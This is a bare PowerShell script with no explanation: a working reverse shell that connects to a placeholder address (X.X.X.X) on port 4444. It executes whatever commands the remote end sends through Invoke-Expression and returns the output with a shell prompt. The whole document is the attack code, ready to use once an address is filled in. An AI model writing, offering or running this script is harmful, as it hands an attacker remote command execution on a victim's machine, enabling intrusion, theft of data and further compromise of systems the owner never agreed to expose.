$client = New-Object System.Net.Sockets.TCPClient("X.X.X.X", 4444)
$s = $client.GetStream()
[byte[]]$b = 0..65535|%{0}
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
    $sb = (iex $data 2>&1 | Out-String)
    $sb2 = $sb + 'PS ' + (Get-Location).Path + '> '
    $sbt = ([text.encoding]::ASCII).GetBytes($sb2)
    $s.Write($sbt, 0, $sbt.Length)
    $s.Flush()
}
$client.Close()
